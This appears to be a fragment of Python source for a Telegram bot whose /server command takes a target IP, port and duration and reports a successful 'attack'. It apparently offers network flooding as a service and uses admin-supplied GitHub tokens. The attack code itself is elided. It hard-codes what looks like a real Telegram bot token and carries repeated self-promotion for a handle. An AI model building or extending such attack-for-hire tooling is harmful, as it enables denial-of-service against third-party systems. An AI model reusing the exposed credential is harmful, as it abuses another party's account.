...
TELEGRAM_TOKEN = '7777560572:AAHp0ecPZ9mBsXCnIYetguZgSwIwd4sfUkU'
...
async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if not github_tokens:
        await update.message.reply_text("Admin must set GitHub token(s) first with /token. Power By @Animelover24")
        return
    if not approved_ids:
        await update.message.reply_text("No approved IDs to run attack on. Use /approve first. Power By @Animelover24")
        return
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /server <ip> <port> <time> Power By @Animelover24")
        return
    ...
    try:
        await msg.edit_text("✅ Attack successfully! Power By @Animelover24")
    except Exception:
        pass
